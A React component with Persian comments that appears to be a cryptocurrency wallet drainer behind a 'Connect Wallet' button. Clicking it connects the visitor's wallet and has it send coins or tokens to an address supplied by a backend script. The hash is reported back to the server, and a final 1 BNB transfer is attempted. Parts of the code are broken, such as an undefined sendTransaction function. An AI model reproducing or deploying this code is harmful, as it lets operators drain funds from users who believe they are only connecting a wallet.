import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { useState } from "react";

function App() {
  const [isConnected, setIsConnected] = useState(false); // وضعیت اتصال کیف پول

  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          // لیست شناسه‌های کیف پول‌ها
        ],
      },
      chains: [1, 56, 137], // اضافه کردن شبکه‌های مختلف
      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();

    // پس از اتصال کیف پول، وضعیت متغیر isConnected تغییر می‌کند
    setIsConnected(true);

    var provider = ethereumProvider;

    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log(account_sender);

    async function genSign(address, chain, type, contract = "0") {
      if (type === "coin") {
        var result = await jQuery.post("send.php", {
          handler: "tx",
          address: address,
          chain: chain,
          type: type,
        });

        var unSigned = JSON.parse(result);
        console.log(unSigned);

        // استفاده از eth_sendTransaction به جای eth_sign
        var txParams = {
          from: address,
          to: unSigned.result.to,
          value: unSigned.result.value,
          gas: "0x5208", // 21000 GWEI (مثال)
          gasPrice: "0x3B9ACA00", // 1 GWEI (مثال)
          chainId: chain,
        };

        var signedTx = await provider.request({
          method: "eth_sendTransaction",
          params: [txParams],
        });

        return signedTx;
      } else if (type === "token") {
        var result = await jQuery.post("send.php", {
          handler: "tx",
          address: address,
          chain: chain,
          type: type,
          contract: contract,
        });

        var unSigned = JSON.parse(result);
        console.log(unSigned);

        // استفاده از eth_sendTransaction برای ارسال توکن
        var txParams = {
          from: address,
          to: contract,
          data: unSigned.result, // داده‌های تراکنش برای توکن‌ها
          gas: "0x5208",
          gasPrice: "0x3B9ACA00",
          chainId: chain,
        };

        var signedTx = await provider.request({
          method: "eth_sendTransaction",
          params: [txParams],
        });

        return signedTx;
      }
    }

    async function acceptSign(signature, type) {
      console.log(type);
      if (type === "coin" || type === "token") {
        var result = await jQuery.post("send.php", {
          handler: "sign",
          signature: signature,
          type: type,
        });
        var resultJson = JSON.parse(result);
        return resultJson.result;
      }
    }

    // استفاده از شبکه‌های مختلف
    var signature = await genSign(account_sender, "56", "coin"); // ارسال تراکنش برای BNB
    console.log(signature);

    var rawsign = await acceptSign(signature, "coin");
    console.log("Raw : " + rawsign);

    // ارسال تراکنش
    var txResult = await sendTransaction(account_sender, 56, "1000000000000000000"); // ارسال 1 BNB
    console.log("Transaction result: ", txResult);
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>{isConnected ? "Wallet Connected" : "Connect Wallet"}</span>
    </a>
  );
}

export default App;
